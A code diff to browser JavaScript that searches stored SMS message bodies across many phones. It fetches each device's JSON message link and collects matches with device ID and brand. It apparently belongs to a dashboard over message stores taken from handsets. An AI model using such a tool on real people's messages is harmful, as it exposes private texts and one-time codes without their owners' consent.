@@ -786,11 +786,14 @@ let _smsSearchAbort  = null;
 function iterMsgsFE(data) {
   const out = [];
   function walk(obj) {
-    if (!obj || typeof obj !== 'object') return;
+    if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return;
     for (const v of Object.values(obj)) {
-      if (!v || typeof v !== 'object') continue;
-      if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) out.push(v);
-      else walk(v);
+      if (!v || typeof v !== 'object' || Array.isArray(v)) continue;
+      if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) {
+        out.push(v);
+      } else {
+        walk(v);
+      }
     }
   }
   walk(data);
@@ -804,7 +807,7 @@ async function runSmsSearch() {
   // Abort any previous search
   if (_smsSearchAbort) _smsSearchAbort.abort();
   _smsSearchAbort = new AbortController();
-  const signal = _smsSearchAbort.signal;
+  const abortSignal = _smsSearchAbort.signal;
 
   const resultsDiv = document.getElementById('sms-search-results');
   const tableWrap  = document.getElementById('device-table-wrap');
@@ -827,15 +830,6 @@ async function runSmsSearch() {
   let done = 0;
   const hits = [];
 
-  function updateProgress() {
-    if (!_smsSearchActive) return;
-    resultsDiv.innerHTML = `
-      <div style="color:var(--muted);font-size:13px;margin-bottom:8px">
-        🔍 Scanning device ${done}/${total}… found <b style="color:var(--yellow)">${hits.length}</b> match(es) so far
-        ${hits.length ? `<br><br>${renderHits()}` : ''}
-      </div>`;
-  }
-
   function renderHits() {
     return hits.slice(0,200).map(h => `
       <div class="sms-hit-card">
@@ -847,40 +841,46 @@ async function runSmsSearch() {
       </div>`).join('');
   }
 
+  function updateProgress() {
+    if (!_smsSearchActive) return;
+    resultsDiv.innerHTML = `
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px">
+        🔍 Scanning ${done}/${total} devices… <b style="color:var(--yellow)">${hits.length}</b> match(es) found
+      </div>
+      ${hits.length ? renderHits() : ''}`;
+  }
+
   updateProgress();
 
   for (const d of devices) {
-    if (signal.aborted || hits.length >= 200) break;
+    if (abortSignal.aborted || hits.length >= 200) break;
 
-    // Strip query params from smsLink to get clean JSON endpoint
-    const url = d.smsLink.replace(/\?.*$/, '.json');
+    // Use smsLink as-is (already ends with .json?print=pretty)
+    const url = d.smsLink;
 
     try {
-      const resp = await fetch(url, {
-        headers: { 'Accept': 'application/json' },
-        signal: AbortSignal.any ? AbortSignal.any([signal, AbortSignal.timeout(8000)])
-                                : signal,
-      });
-      if (resp.ok) {
-        const text = await resp.text();
-        if (text && text[0] !== '<' && text !== 'null') {
-          let smsData;
-          try { smsData = JSON.parse(text); } catch { smsData = null; }
-          if (smsData) {
-            for (const msg of iterMsgsFE(smsData)) {
-              const body = String(msg.body || msg.message || msg.msg || msg.text || '');
-              if (body && body.toLowerCase().includes(q)) {
-                hits.push({ deviceId: d.deviceId, brand: d.brand, body });
-                if (hits.length >= 200) break;
-              }
-            }
-          }
+      const resp = await fetch(url, { signal: abortSignal });
+      if (!resp.ok) { done++; continue; }
+      const text = await resp.text();
+      if (!text || text.trim() === 'null' || text.trim()[0] === '<') { done++; continue; }
+      let smsData;
+      try { smsData = JSON.parse(text); } catch { done++; continue; }
+      if (!smsData) { done++; continue; }
+
+      for (const msg of iterMsgsFE(smsData)) {
+        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+        if (body && body.toLowerCase().includes(q)) {
+          hits.push({ deviceId: d.deviceId, brand: d.brand, body });
+          if (hits.length >= 200) break;
         }
       }
-    } catch { /* timeout / network error — skip device */ }
+    } catch (e) {
+      if (abortSignal.aborted) break;
+      // network/timeout error — skip silently
+    }
 
     done++;
-    if (done % 3 === 0 || done === total) updateProgress();
+    if (done % 5 === 0 || done === total) updateProgress();
   }
 
   // Final render
